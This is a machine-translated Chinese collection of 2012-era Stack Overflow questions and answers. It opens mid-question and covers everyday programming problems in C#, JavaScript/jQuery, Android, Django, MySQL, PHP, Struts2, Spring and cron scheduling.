"A", "B", "C" 
```

注意

```
var carriers = _inventoryContext.Items.Select(i => i.Carrier).Distinct(); 
```

不工作；我得到“不支持'Distinct'方法”，没有内部异常。

我正在使用 SQL Server 2008 Express。`Items`是 a[`DataServiceQuery<Item>`](http://msdn.microsoft.com/en-us/library/cc646677.aspx)并且它的`Carrier`属性是一个字符串。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T18:08:22.510

您的示例应该有效，但这是您可以尝试的另一种方法

```
List<string> carriers = _inventoryContext.Items.GroupBy(i => i.Carrier)
                                               .Select(i => i.Key)
                                               .ToList(); 
```

# javascript - 单击后切换锚点的单击功能

> ID：10338268
> 
> 赞同：0
> 
> 时间：2012-04-26T17:18:04.887
> 
> 标签：javascript

是否可以更改单击锚点后执行的 onclick javascript 函数？

例子：

```
<a id="myLocation" class="locator" href="#" onclick="javascript:getMyLocation();">&nbsp;&nbsp;&nbsp;&nbsp;My Location</a> 
```

当用户单击此锚点时，他们的位置将显示在带有标记的地图上。

我希望现在将 onclick 更改为 RemoveLocation()，以便当他们再次单击锚点时，会删除他们在地图上的位置的标记。

getMyLocation() 和 RemoveLocation 已经编写好了，如果可能的话，我只需要在用户单击锚点后更改 onclick 事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:20:53.687

将此添加到您的`getMyLocation()`函数中：

```
document.getElementById("myLocation").onclick = RemoveLocation; 
```

在`RemoveLocation()`函数中：

```
document.getElementById("myLocation").onclick = getMyLocation; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:28:55.243

是的，有可能！

您只需为该元素上的 click 事件重新分配事件处理程序。

就像是：

```
function getMyLocation() {

    ...

    document.getElementById("myLocation").onclick = RemoveLocation;
}

function RemoveLocation() {

    ...

    document.getElementById("myLocation").onclick = getMyLocation;
} 
```

或者，如果您使用 jQuery，请参阅[切换事件功能](http://api.jquery.com/toggle-event/)

# javascript - 在 main.js 文件中使用 getScript 以减少负载大小

> ID：10338269
> 
> 赞同：3
> 
> 时间：2012-04-26T17:18:06.407
> 
> 标签：javascript, jquery

`$.getScript();`在 jQuery 中使用来执行以下操作是否有意义：

```
$("#action-one").click(function() {     
    $.getScript('scripts/action-one.js');
});

$("#action-two").click(function() {     
    $.getScript('scripts/action-two.js');
}); 
```

会减小 main.js 文件的大小，从而加快加载速度吗？也意味着只有在使用代码时才会加载代码，如果一遍又一遍地加载相同的代码，可能会出现问题..

（我目前没有这样做，但如果你有非常大的 js 文件，我就会想到它）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:20:45.697

如果不立即需要代码，则在页面加载时异步加载这些脚本是有意义的。这样它们就不会以任何方式减慢页面加载速度，但是它们将在以后/如果需要时立即可用。

但是，仅在需要时加载它们通常会干扰用户体验 - 使查看者等待脚本加载，然后才能继续操作，因此大多数网站认为仅在需要时加载它们不是最佳用户体验。

当然，也有例外。如果脚本很大并且很少需要，那么按需加载可能是有意义的。但通常它们并不大，因此在页面加载后异步加载它们是一个更好的主意。

另外，请记住，一旦脚本被加载一次，它们通常会从浏览器缓存中快速加载。

# javascript - 无法显示 fancyBox 标题

> ID：10338279
> 
> 赞同：0
> 
> 时间：2012-04-26T17:18:53.240
> 
> 标签：javascript, jquery, fancybox

我想知道是否有人可以提供帮助。

我对此有点陌生，所以我确信这将是一个基本问题，但请多多包涵。

我正在使用下面的脚本来创建一个带有 fancyBox 的图片库。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
<html xmlns="http://www.w3.org/1999/xhtml">  
<head>  
  <title>Gallery</title>  
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />  
  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>   
  <script type="text/javascript" src="fancybox/jquery.fancybox-1.3.4.pack.js"></script> 
  <script type="text/javascript" src="fancybox/jquery.easing-1.4.pack.js"></script> 
  <script type="text/javascript" src="fancybox/jquery.easing-1.4.pack.js"></script>  
  <script type="text/javascript" src="fancybox/jquery.mousewheel-3.0.4.pack.js"></script>  
  <script type="text/javascript" src="fancybox/source/helpers/jquery.fancybox-buttons.js?v=1.0.2"></script>  
  <script type="text/javascript" src="fancybox/source/helpers/jquery.fancybox-media.js?v=1.0.0"></script>  
  <script type="text/javascript" src="/fancybox/source/helpers/jquery.fancybox-thumbs.js?v=2.0.6"></script>  
  <link rel="stylesheet" href="fancybox/source/helpers/jquery.fancybox-buttons.css?v=1.0.2" type="text/css" media="screen" />  
  <link rel="stylesheet" href="fancybox/jquery.fancybox-1.3.4.css" type="text/css" media="screen" />  
  <link rel="stylesheet" href="fancybox/source/helpers/jquery.fancybox-thumbs.css?v=2.0.6" type="text/css" media="screen" />  

  <script type="text/javascript">  

$(document).ready(function() { 
    $("a.fancybox").fancybox({

        'centerOnScroll':'true',
        helpers : {
        title : {
            type : 'inside'
        }
    },

        'transitionIn':'elastic',
        'transitionOut':'elastic',
        'speedIn':600, 
        'speedOut': 200,
        'overlayShow':false
    });

});

</script>  

</head> 
<body style="font-family: Calibri; color:  #505050; font-size: 9px; border-bottom-width: thin; margin-top: 5px; margin-left: 100px; margin-right: 100px; margin-bottom: -10px; float: left; position: absolute;"> 
<div align="right" class="style1"> <a href = "javascript:document.gallery.submit()"/> Add Images <a/> &larr; View Uploaded Images </div> 
  <form id="gallery" name="gallery" class="page" action="index.php" method="post">   

                  <?php for ($i = 0; $i < $descriptions->documentElement->childNodes->length; $i++) :  
                          $xmlFile = $descriptions->documentElement->childNodes->item($i);  
                          $name = htmlentities($xmlFile->getAttribute('originalname'), ENT_COMPAT, 'UTF-8');  
                          $description = htmlentities($xmlFile->getAttribute('description'), ENT_COMPAT, 'UTF-8');  
                          $source = $galleryPath . rawurlencode($xmlFile->getAttribute('source'));  
                          $thumbnail = $thumbnailsPath . rawurlencode($xmlFile->getAttribute('thumbnail'));  
                  ?> 
        <a class="fancybox" rel="allimages" href="<?php echo $source; ?>"><img src="<?php echo $thumbnail; ?>" alt="<?php echo $name; ?>"/></a><?php endfor; ?> 
  </form>  
</body>  
</html> 
```

我遇到的问题是我无法在图像内创建标题，或者实际上除了“悬停”之外的任何其他地方，这似乎是默认设置。我已经尝试了各种不同的方法来尝试让它发挥作用。

IE

```
$(document).ready(function() { 
    $("a.fancybox").fancybox({

        'centerOnScroll':'true',
        'titleShow':'true',
        'titlePosition':'inside',
        'transitionIn':'elastic',
        'transitionOut':'elastic',
        'speedIn':600, 
        'speedOut': 200,
        'overlayShow':false
    });

}); 
```

和

```
 $(document).ready(function() { 
        $("fancybox").fancybox({

            'centerOnScroll':'true',
            'titleShow':'true',
            'titlePosition':'inside',
            'transitionIn':'elastic',
            'transitionOut':'elastic',
            'speedIn':600, 
            'speedOut': 200,
            'overlayShow':false
        });

    }); 
```

我试过添加和删除`'`，删除空格，都没有成功。我只是想知道是否有人可以看看这个并让我知道我哪里出错了。

非常感谢和问候

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:21:20.737

在这一行：

```
<a class="fancybox" rel="allimages" href="<?php echo $source; ?>"><img src="<?php echo $thumbnail; ?>" alt="<?php echo $name; ?>"/></a><?php endfor; ?> 
```

尝试在 中设置`title`属性`a`，而不是`alt`在`img`. 所以它变成：

```
<a class="fancybox" rel="allimages" title="<?php echo $name; ?>" href="<?php echo $source; ?>"><img src="<?php echo $thumbnail; ?>" /></a><?php endfor; ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-27T09:31:27.977

如果将标题元素添加到您的锚标记不起作用，您可以在您的幻想框设置中强制标题

```
$(document).ready(function() { 
  $("fancybox").fancybox({
    'title'          : 'yourtitle'
    'centerOnScroll' : 'true',
    'titleShow'      : 'true',
    'titlePosition'  : 'inside',
    'transitionIn'   : 'elastic',
    'transitionOut'  : 'elastic',
    'speedIn'        : 600, 
    'speedOut'       : 200,
    'overlayShow'    : false
  });
}); 
```

# java - 3.1 上的 ActionBarSherlock EditText 布局问题

> ID：10338283
> 
> 赞同：2
> 
> 时间：2012-04-26T17:19:25.877
> 
> 标签：java, android, actionbarsherlock

我正在使用 ActionBarSherlock，但在 3.1 或更高版本上的 EditText 布局有问题。我正在使用 EditText 的默认样式，在 < 3.1 上它工作正常，但在 3.1 中，EditText 的样式似乎已更改为具有不同边框的透明背景。此外，如果 EditText 是密码类型，则边框仅显示在 EditText 的底部。我错过了什么？

```
<EditText
            android:id="@+id/user"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center|center_vertical"
            android:inputType="textMultiLine"
            android:nextFocusDown="@+id/password"
            android:singleLine="true"
            android:text="" > 
```

# sql - Django：计算表的增量

> ID：10338284
> 
> 赞同：3
> 
> 时间：2012-04-26T17:19:30.723
> 
> 标签：sql, django, postgresql, django-1.4

我在 Postgres 数据库中有两个表，它们具有相同的结构和部分重叠的数据，将它们`table1`称为`table2`. 我试图通过获取一个表中的所有行而不是另一个表来计算增量。我试图运行的查询大致是这样的：

```
SELECT * FROM table1 WHERE id NOT IN (SELECT id FROM table2)
SELECT * FROM table2 WHERE id NOT IN (SELECT id FROM table1) 
```

在 Django 1.4 中构建它的最佳方法是什么？有什么方法可以只为两个表定义一个模型吗？查询此信息的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:42:42.190

您可以制作一个基表：

```
class Table(models.Model):
   #some fields
   pass

class Table1(Table):
   #some fields specific for table 1
   pass

class Table2(Table):
   #some fields specific for table 2
   pass 
```

要获取表增量，您可以使用：

```
Table1.objects.exclude(id__in=Table2.objects.values_list('id', flat=True)) 
```

# mysql - 如何显示 MySQL 中不超过一天的行？

> ID：10338285
> 
> 赞同：0
> 
> 时间：2012-04-26T17:19:31.550
> 
> 标签：mysql, joomla

我想显示新闻，例如昨天的新闻。这是我的查询的样子。是否有任何神奇的代码行可以做到这一点？

```
$query = '
    SELECT a.*, 
           CASE WHEN CHAR_LENGTH(a.alias) THEN  CONCAT_WS(":", a.id, a.alias)
                                          ELSE a.id END as slug,
           CASE WHEN CHAR_LENGTH(b.alias) THEN CONCAT_WS(":", b.id, b.alias) 
                                          ELSE b.id END as catslug,
           b.title as category_title, 
           b.alias as categoryalias, 
           b.params as categoryparams,
           u.name AS author
    FROM #__content as a 
    LEFT JOIN #__categories as b ON a.catid = b.id
    LEFT JOIN #__users AS u ON u.id = a.created_by
    WHERE ' . $where. ' 
    ORDER BY ' . $orderby. ' 
    LIMIT ' . $limit; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T23:53:45.080

“神奇”的代码行应该在您的 WHERE 子句中。

例如，如果您的日期仅为 YYYY-MM-DD

```
$query .= 'WHERE b.created_date = '.$db->quote( date('Y-m-d', strtotime('-1 day')) ).' 
```

例如，如果您的日期列是 YYYY-MM-DD H:i:s

```
$query .= 'WHERE DATE_FORMAT(b.created_date,"%Y-%m-%d") = '.$db->quote( date('Y-m-d', strtotime('-1 day')) ).' 
```

# c# - 如何检索信号量的名称

> ID：10338288
> 
> 赞同：0
> 
> 时间：2012-04-26T17:19:39.690
> 
> 标签：c#, multithreading, semaphore

我的代码在初始化时会创建许多信号量。每一个都与一个 ftp 服务器相关联，我的系统将从多个工作流中与之通信。随着相同工作流的不同实例开始，我将信号量注入到工作流中，具体取决于工作流将与哪个 ftp 站点进行通信。

我遇到的情况是，应该包含相同信号量的 2 个或更多工作流尝试访问 ftp 服务器的次数超过了信号量应允许的容量。

我已经命名了信号量，因为我认为我可以在建立 ftp 连接的位置检索名称，以便我可以检查正确的信号量是否在正确的工作流程中。

如何访问信号量的名称？

我试图构建一个从信号量继承的对象并添加一个名称字段，但这不起作用，因为信号量是密封的

```
public class MySemaphore : System.Threading.Semaphore
{
   string SemaphoreName = "Bob";
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:05:52.600

如果您使用的是 .NET 4.0，请`SemaphoreSlim`改用。它不是密封的。

如果您必须使用`Semaphore`，那么您将不得不创建自己的类而不继承它。例如，您将不得不对多态性进行打击，因此它无法在内部工作`WaitHandle.WaitAny`，但这是一个可行的解决方法。

```
public class MySemaphore
{
  private Semaphore underlying;

  public MySemaphore(int initialCount, int maximumCount)
  {
    underlying = new Semaphore(initialCount, maximumCount);
  }

  public bool WaitOne()
  {
    return underlying.WaitOne();
  }

  public int Release()
  {
    return underlying.Release();
  }

  public string Name { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:30:37.657

由于这是出于调试目的，要以某种方式命名您的信号量，您可以在信号量构造中使用由每个信号量键入的字典，即使用

```
 public static readonly Dictionary<Semaphore, string> SemaphoreNames 
            = new Dictionary<Semaphore,string>();

...
    Semaphore sem = new Semaphore(0, 200);
    SemaphoreNames[sem] = "Bob";
... 
```

您可以从 SemaphoreNames[someSemaphore] 访问它们的名称。如果这只是用于调试，我会在#ifdef DEBUG 和#endif 之间放置额外的行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T10:05:05.890

我带着这个去了。

```
public class SemaphoreSlimNamed : SemaphoreSlim
{
    public string name;

    public SemaphoreSlimNamed(int InitialCapacity, int MaxCapacity) : base(InitialCapacity, MaxCapacity)
    {

    }
} 
```

感谢您的建议

# android - 上下文操作栏样式

> ID：10338289
> 
> 赞同：23
> 
> 时间：2012-04-26T17:19:44.603
> 
> 标签：android, android-actionbar, contextual-action-bar

我正在寻找有关上下文操作栏 (CAB) 的样式信息。实际上我只需要更改文本的颜色..

![上下文操作栏的结果](../Images/5c6144cf3ce84a8597a071342758597d.png)

从上面可以看出，这是使用标准的*Theme.Holo.Light.DarkActionBar*主题，所以我只需要将文本颜色设置为白色！

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-06-30T19:43:26.453

要更改上下文操作栏中文本的颜色/等：

```
public boolean onCreateActionMode(ActionMode mode, Menu menu) {
  //mode.setTitle("Contextual Action Bar"); (replace this call)
  TextView tv= (TextView)getLayoutInflater().inflate(R.layout.contextual_title, null);
  tv.setText("Contextual Action Bar");
  mode.setCustomView(tv); 
```

其中 layout/contextual_title.xml 包含一个具有所需颜色/大小/样式等的 TextView

事实上，上下文操作栏中的几乎所有内容都可以设置样式。唯一的问题是搜索“上下文”这个词毫无用处。相关的样式特性都称为“actionMode...”。这是我使用的一些（在我的主题中定义。）

```
<item name="android:actionModeCloseDrawable">@drawable/check</item>
<item name="android:actionModeCutDrawable">@drawable/ic_menu_cut_holo_dark</item>
<item name="android:actionModeCopyDrawable">@drawable/ic_menu_copy_holo_dark</item>
<item name="android:actionModePasteDrawable">@drawable/ic_menu_paste_holo_dark</item>
<item name="android:actionModeSelectAllDrawable">@drawable/ic_menu_selectall_holo_dark</item>
<item name="android:actionModeBackground">@drawable/contextual</item>
<item name="android:actionModeCloseButtonStyle">@style/MyCloseButton</item>

<!-- these change the press backgrounds for the vanilla actionBar and for search -->
<item name="android:windowContentOverlay">@null</item>
<item name="android:selectableItemBackground">@drawable/bar_selector</item>
<item name="android:actionBarItemBackground">@drawable/bar_selector</item>      

<!-- these were defined in platform/.../data/res/values/... but Eclipse didn't recognize them -->
<!--? item name="android:actionModeShareDrawable">@drawable/icon</item -->
<!--? item name="android:actionModeFindDrawable">@drawable/icon</item -->
<!--? item name="android:actionModeWebSearchDrawable">@drawable/icon</item -->
<!-- item name="android:actionModeBackground">@drawable/red</item -->

<!-- and finally -->
<style name="MyCloseButton" parent="android:style/Widget.ActionButton.CloseMode">
    <item name="android:background">@drawable/bar_selector</item>
</style> 
```

您可以轻松设置自己的文本编辑剪切/粘贴/复制/全选图标、条形背景和按图标时更改颜色的图标背景（上面的 bar_selector）。图标是 ImageView，而不是按钮，并且编辑 ID（和可按下的背景）附加到 ImageView 的父级（每个视图一个父级），这是一种“内部”类型。

永远不清楚样式中的什么地方——我在平台 Themes.xml 中找到了 selectableItemBackground 的位置，并复制并修改了指向的可绘制对象。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-31T21:20:24.800

我对自己的问题发表了评论，这实际上是我使用的 android 版本中的一个错误（可能是 4.0 的早期版本）

这是描述的错误：[http ://code.google.com/p/android/issues/detail?id=26008](http://code.google.com/p/android/issues/detail?id=26008)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-11T17:09:24.647

如果您手动启动上下文操作模式，您可以在启动之前使用新主题调用 setTheme()（如果您想避免黑底黑字问题，可能是 Theme.AppCompat.Light.DarkActionBar）。如果您已经设置了活动的内容视图，这不会影响当前活动的主题。

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.my_activity_layout);

    // these lines can occur anywhere so long as you've already 
    // called "setContentView()" on the activity. The theme
    // you set here will apply to the action mode, but not to 
    // the activity.
    setTheme(R.style.Theme_AppCompat_Light_DarkActionBar);
    startSupportActionMode(myActionModeCallback);

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-26T22:58:40.560

它现在可以工作了，但是您必须在 values/styles.xml（不是 values-v#/styles.xml）中输入它并在一般（非 API 特定标签）中输入它

```
<!-- Application theme. -->
<style name="AppTheme" parent="AppBaseTheme">
    <item name="android:actionModeCloseDrawable">@drawable/ic_launcher</item>
    <!-- All customizations that are NOT specific to a particular API-level can go here. -->
</style> 
```

# c# - C#、反射和原始类型

> ID：10338290
> 
> 赞同：4
> 
> 时间：2012-04-26T17:19:44.620
> 
> 标签：c#, reflection, primitive-types

> **可能重复：**
> [如何在 C# 中获取类型的原始名称？](https://stackoverflow.com/questions/4369737/how-can-i-get-the-primitive-name-of-a-type-in-c)

我在 C# 中有以下代码：

```
 Assembly sysAssembly = 0.GetType().Assembly;
        Type[] sysTypes = sysAssembly.GetTypes();
        foreach (Type sysType in sysTypes)
        {
            if (sysType.IsPrimitive && sysType.IsPublic)
                Console.WriteLine(sysType.Name);
        } 
```

此代码输出：

> 布尔，字节，字符，双精度，Int16，Int32，Int64，IntPtr，SByte，单，UInt16，UInt32，UInt64，UIntPtr，

我想尽可能替换`Boolean`by `bool`，`Byte`by`byte`等，而不依赖于固定数组或字典。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T17:24:57.333

这是重复的

[C# - 通过反射获取简单类型的用户友好名称？](https://stackoverflow.com/questions/4615553/c-sharp-get-user-friendly-name-of-simple-types-through-reflection)

这也是 Skeet 的一个很好的答案

[如何在 C# 中获取类型的原始名称？](https://stackoverflow.com/questions/4369737/how-can-i-get-the-primitive-name-of-a-type-in-c)

答案是，你可以，而且不用字典。

```
Type t = typeof(bool);

string typeName;
using (var provider = new CSharpCodeProvider())
{
  var typeRef = new CodeTypeReference(t);
  typeName = provider.GetTypeOutput(typeRef);
}

Console.WriteLine(typeName);    // bool 
```

# windows - 在 VB.NET 中清理二维数组

> ID：10338294
> 
> 赞同：0
> 
> 时间：2012-04-26T17:19:47.850
> 
> 标签：windows, vb.net, arrays

我像这样声明了我的多维数组：

```
Dim invoice_discountitems(100, 1) As String 
```

我用这个填充我的数组：

```
'Fill Array with items discounts
                        For i As Int16 = 0 To data_set.Tables("discount_items").Rows.Count - 1
                            invoice_discountitems(i, 0) = data_set.Tables("discount_items").Rows(i).Item("item_code")
                            invoice_discountitems(i, 1) = data_set.Tables("discount_items").Rows(i).Item("discountitem_average")
                        Next 
```

现在我怎样才能删除这个数组的填充项？提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:38:27.913

因为数组是静态大小的，所以空数组与新初始化的数组相同。所以，如果你想清除整个事情：

```
invoice_discountitems = New String(100, 1) 
```

或者，如果您想[清除特定元素，请使用 Array.Clear()](http://msdn.microsoft.com/en-us/library/system.array.clear.aspx)

```
Array.Clear(invoice_discountitems, 1, 10) 
```

# dynamics-crm - 隐藏 DateTime 字段上的日期部分

> ID：10338295
> 
> 赞同：1
> 
> 时间：2012-04-26T17:19:47.937
> 
> 标签：dynamics-crm, crm, dynamics-crm-4

我想在我的 CRM 表单上有一个仅限时间的字段。由于[显然](https://stackoverflow.com/questions/720994/how-can-i-have-a-time-field-in-dynamics-crm-4-0)不可能，我计划使用 DateTime 字段并隐藏日期部分（下图中以红色圈出）。

![在此处输入图像描述](../Images/a1bf9b3fc48db911b3491544e96044d5.png)

如何使用 Javascript 隐藏 DateTime 字段上的日期部分？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-03T11:38:34.617

找到了：

```
// Set the date in order to be able to modify the time
document.getElementById("field_name").DataValue = new Date(2000, 1, 1);
// Hide the date part
document.getElementById("field_name").childNodes[0].childNodes[0].style.display =
    "none";
document.getElementById("field_name").childNodes[0].childNodes[1].style.display =
    "none"; 
```

# spring - 春季命名空间处理程序

> ID：10338302
> 
> 赞同：2
> 
> 时间：2012-04-26T17:20:07.430
> 
> 标签：spring, xml-namespaces

什么是命名空间处理程序？编写我们的自定义 NamespaceHandler 需要什么？

请解释一下NamespaceHandler的意义。向我提供互联网上的任何链接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:35:47.953

它处理在文件中找到的特定 XML 标记，例如命名空间内`<log:return />`的`return`标记`log`。

最好的参考通常是[Javadoc](http://static.springsource.org/spring/docs/3.0.7.RELEASE/javadoc-api/org/springframework/beans/factory/xml/NamespaceHandler.html)。

如果您想在 XML 配置中使用自定义 XML 标记，这很有用： [http ://www.theserverside.com/news/1364131/Authoring-Custom-Namespaces-in-Spring-20](http://www.theserverside.com/news/1364131/Authoring-Custom-Namespaces-in-Spring-20)

如果您有一个框架并希望将 Spring 集成添加到您的框架中，它可能会很有用。在这种情况下，定义等效的注释会更重要。

# struts2 - struts2 - 如何将请求参数填充到操作类中的相应字段？

> ID：10338306
> 
> 赞同：1
> 
> 时间：2012-04-26T17:20:19.043
> 
> 标签：struts2, struts, interceptor

如果有一个请求参数' **name** '传递给一个动作，如果我们有一个名为' **name '的字段，我们可以在我们的****Action**类中接收它。哪个拦截器负责执行此操作？我查看了代码，但它只将参数设置到**值堆栈**上，而不是在动作类的相应字段中**`ParametersInterceptor`**

 ***** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T22:21:49.370

> 但它只将参数设置到值堆栈上，而不是在动作类的相应字段中

您的推理中有一个小故障：动作类位于值堆栈的顶部！所以 com.opensymphony.xwork2.interceptor.ParametersInterceptor 负责。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-29T21:44:44.627

不过，作为一条建议，我建议您实际上在操作类上没有名为“名称”的参数，而是将这些字段从您的操作类移动到另一个将用作您的“模型”的类中。然后，让您的操作类实现 ModelDriven 接口。这会将模型类放置在 ValueStack 的顶部而不是操作类实例上，然后“name”参数将映射到您的模型实例上。

将模型/数据关注点与动作/控制关注点分离到另一个类将使您的代码更具可读性和可维护性。当然，如果只有一个参数，那么将它分成一个单独的类将是愚蠢的。但是，超过 2 或 3 个参数，您将从分离中受益。****

# javascript - 检查用户是否是 Facebook 页面的粉丝

> ID：10338307
> 
> 赞同：2
> 
> 时间：2012-04-26T17:20:23.950
> 
> 标签：javascript, facebook, api, sdk

登录后，如果用户不是 Facebook 页面的粉丝，我会尝试返回，但结果始终是“未定义”。但是，如果我将“返回”替换为“警报”，则效果很好。

```
function pageFan()
{
    FB.api({ method: 'pages.isFan', page_id: '175625039138809' }, function(response) {
        showAlert(response);
    });
}

function showAlert(response)
{
    if (response == true) {  
        return 'like the Application.';
    } else {
        return "doesn't like the Application.";
    }
}

var like = pageFan();
document.getElementById('debug').innerHTML = like; //return undefined 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:26:57.953

这个问题已经[回答了](https://stackoverflow.com/questions/6246449/facebook-how-to-check-if-user-has-liked-page-and-show-content)。

相关的Javascript：

```
$(document).ready(function(){
      FB.login(function(response) {
      if (response.session) {

          var user_id = response.session.uid;
          var page_id = "40796308305"; //coca cola
          var fql_query = "SELECT uid FROM page_fan WHERE page_id = "+page_id+"and uid="+user_id;
          var the_query = FB.Data.query(fql_query);

          the_query.wait(function(rows) {

              if (rows.length == 1 && rows[0].uid == user_id) {
                  $("#container_like").show();

                  //here you could also do some ajax and get the content for a "liker" instead of simply showing a hidden div in the page.

              } else {
                  $("#container_notlike").show();
                  //and here you could get the content for a non liker in ajax...
              }
          });

      } else {
        // user is not logged in
      }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:27:39.210

那是因为`return`in`showAlert`没有返回“进入”`pageFan`函数。该`showAlert`函数作为回调传递，这意味着稍后将在`pageFan`' 执行之外调用它。我认为您需要阅读[有关回调函数和异步编程](http://recurial.com/programming/understanding-callback-functions-in-javascript/)的更多信息。

```
function showAlert(response)
{
    if (response == true) {  
        document.getElementById('debug').innerHTML = 'like the Application.';
    } else {
        document.getElementById('debug').innerHTML = "doesn't like the Application.";
    }
} 
```

# php - Cron 作业没有给出所需的结果，但通过浏览器访问相同的文件确实

> ID：10338316
> 
> 赞同：1
> 
> 时间：2012-04-26T17:20:53.590
> 
> 标签：php, cron, cutycapt

我需要运行一个`php script`来生成一些网站的使用`snapshots`，我从数据库中获取网站的地址，然后在生成截图后删除这条记录。我用 它没有用，但如果我使用它访问同一个文件工作正常，如果使用它的命令运行这个脚本也工作正常。然后我刚刚创建了另一个文件并使用; 将此文件添加到它几天后运行良好，但现在这种方法也行不通。我不知道发生了什么。我没有更改任何这些文件。我还尝试了访问该 url 的命令，但未能获得所需的输出。我的 crontab 现在看起来像这样 `CutyCapt``crone job``*/5 * * * * /usr/bin/php -f /path/generate.php``crone job``browser``php``command line``file_get_contents``crone job``wget``*/5 * * * * wget "http://www.mysite.com/generate.php" -O /dev/null`

奇怪的是，crone 作业执行得很好，它从数据库中获取数据并删除记录，但不更新图像。

权限或类似问题是否有任何问题阻止它使用 cron 作业生成图像，但在使用浏览器访问时不会。

请帮助我卡住了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:31:30.373

此页面上是否有任何用户凭据，例如基本身份验证？如果是这样，您必须在 wget 请求中定义用户名和密码，例如

```
wget  --http-user=user --http-password=password "http://url" ? 
```

并通过从 php 命令行运行 yor 脚本尝试另一种解决方案，这样您的 crontab 可能看起来像

```
*/5 * * * * /usr/bin/php -f /path/to/generate.php 
```

试试这个解决方案，它会起作用，它比点击服务器对你的数据执行后台操作要好

我希望这会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:29:49.460

我不知道您的脚本在内部做什么，但请记住，用户的 cron 作业不会继承用户环境。因此，如果您的 php 脚本正在运行任何 shell 命令，您可能会遇到 PATH 问题。

如果您从脚本运行 shell 命令，请尝试在您的 php 脚本中设置 PATH 环境变量，看看是否有帮助。

# php - 将新记录插入mysql表并为多个表添加具有相同id的新记录

> ID：10338325
> 
> 赞同：0
> 
> 时间：2012-04-26T17:21:27.633
> 
> 标签：php, mysql, insert

我正在设计一个糖尿病管理系统，我的问题是在两个表中插入一条新记录。我有一个包含以下字段的用户表：user_ID (PK)、用户名、密码等。我还有一个配置文件表，它存储有关用户的个人信息。配置文件：User_ID（来自用户表的 FK）、名字、姓氏、地址等。

我已将 user_id 作为外键存储在配置文件表中，因为我想让用户与他们自己的配置文件相关联。例如，用户名 grover 和 User_Id 为“3”的人将拥有一个包含个人信息的个人资料，并且个人资料表中的 user_ID 也将是“3”。我希望以上是有道理的。我的问题是，当我将表单中的数据存储到变量中时，我将如何编写查询以便创建新记录并将正确的字段存储在正确的表中，新记录具有相同的 user_ID用户和配置文件表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:23:56.647

尝试查看[LAST_INSERT_ID](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_last-insert-id)函数。这将为您提供刚刚输入的记录的 PK，即您可以在相应连接表中使用的 user_id

```
 insert into Users values (null,'asdf','asdf',3,1);
    Query OK, 1 row affected (0.00 sec)

    mysql> select last_insert_id();
    +------------------+
    | last_insert_id() |
    +------------------+
    |                1 |
    +------------------+
    1 row in set (0.00 sec) 
```

给你

# php - 为什么我的类只返回第一个值？

> ID：10338335
> 
> 赞同：0
> 
> 时间：2012-04-26T17:22:13.037
> 
> 标签：php, class, function

即使我将返回更改为回显，这个类也会给我一个空白输出，我不确定问题是什么，但我显然不精通处理类和对象。

我确定我只是错误地处理了变量/数组，但是我看不到在哪里，也许不应该在下面声明变量，`Class`因为只有在创建人时才应该返回它们？我应该在函数中声明变量，还是根本不声明它们，因为它们应该由 处理`$args`？

**更新的问题：**如何让它返回每个参数而不仅仅是 FIRSTNAME？

PHP：

```
class people_handler
{
    public $firstname;
    public $middlename;
    public $lastname;
    public $city;
    public $province_state;
    /* zip+4 is default for postcode (postal code) */
    public $postcode;
    public $country;

    function create_people($args)
    {
        $fullname=array($this->firstname,$this->middlename,$this->lastname);
        $normname=array($this->firstname,$this->lastname);
        $fulladdress=array($this->city,$this->province_state,$this->postcode,$this->country);
        if(!$args->middlename&&$args->firstname && $args->lastname && $args->city && $args->province_state && $args->postcode && $args->country)
        {
            $temp_arr=array($normname,$fulladdress);
            foreach($temp_arr as $value)
            {
                foreach($value as $values)
                {
                    return $values;
                }
            }
        }
        else if($args->firstname && $args->middlename && $args->lastname && $args->city && $args->province_state && $args->postcode && $args->country)
        {
            $temp_arr=array($fullname,$fulladdress);
            foreach($temp_arr as $value)
            {
                foreach($value as $values)
                {
                    return $values;
                }
            }
        }
        else
        {
            die ("Must enter all values excluding middlename.");
        }
    }
}

$p1=new people_handler;
